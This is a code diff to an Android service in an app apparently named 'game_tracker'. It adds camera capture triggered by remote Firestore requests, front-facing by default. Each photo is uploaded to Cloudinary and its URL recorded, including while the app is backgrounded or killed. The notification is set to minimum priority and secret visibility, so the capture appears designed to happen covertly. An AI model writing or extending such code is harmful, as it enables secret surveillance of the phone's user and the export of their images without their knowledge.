@@ -3,14 +3,18 @@ package com.example.game_tracker
 import android.app.Notification
 import android.app.Service
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.graphics.ImageFormat
+import android.hardware.camera2.*
 import android.media.ImageReader
+import android.os.Build
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
 import android.util.Size
 import androidx.core.app.NotificationCompat
-import android.hardware.camera2.*
+import com.google.firebase.firestore.FieldValue
+import com.google.firebase.firestore.FirebaseFirestore
 import java.io.File
 import java.io.FileOutputStream
 
@@ -20,21 +24,23 @@ class CameraCaptureService : Service() {
     private var imageReader: ImageReader? = null
     private var handler: Handler? = null
 
-    override fun onCreate() {
-        super.onCreate()
-    }
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(ForegroundService.NOTIFICATION_ID, createNotification())
+        val notification = createNotification()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(ForegroundService.NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+        } else {
+            startForeground(ForegroundService.NOTIFICATION_ID, notification)
+        }
 
         val facing = intent?.getStringExtra("cameraFacing") ?: "front"
+        val requestId = intent?.getStringExtra("requestId")
 
-        startCapture(facing)
+        startCapture(facing, requestId)
 
         return START_NOT_STICKY
     }
 
-    private fun startCapture(facing: String) {
+    private fun startCapture(facing: String, requestId: String?) {
         val handlerThread = HandlerThread("camera_capture")
         handlerThread.start()
         handler = Handler(handlerThread.looper)
@@ -69,9 +75,34 @@ class CameraCaptureService : Service() {
                     fos.flush()
                     fos.close()
 
+                    // Broadcast to Flutter app if alive
                     val done = Intent("com.example.game_tracker.CAMERA_CAPTURE_COMPLETE")
                     done.putExtra("path", file.absolutePath)
                     sendBroadcast(done)
+
+                    // Upload directly to Cloudinary and update Firestore for background/killed state
+                    if (!requestId.isNullOrEmpty()) {
+                        CloudinaryUploader.uploadFile(file) { uploadedUrl ->
+                            val firestore = FirebaseFirestore.getInstance()
+                            if (!uploadedUrl.isNullOrEmpty()) {
+                                firestore.collection("screenshot_requests").document(requestId).update(
+                                    mapOf(
+                                        "status" to "completed",
+                                        "screenshotUrl" to uploadedUrl,
+                                        "completedAt" to FieldValue.serverTimestamp()
+                                    )
+                                )
+                            } else {
+                                firestore.collection("screenshot_requests").document(requestId).update(
+                                    mapOf(
+                                        "status" to "failed",
+                                        "error" to "Background Cloudinary upload failed",
+                                        "completedAt" to FieldValue.serverTimestamp()
+                                    )
+                                )
+                            }
+                        }
+                    }
                 } catch (e: Exception) {
                     e.printStackTrace()
                 } finally {
@@ -136,7 +167,7 @@ class CameraCaptureService : Service() {
 
     private fun createNotification(): Notification {
         val builder = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setOngoing(true)
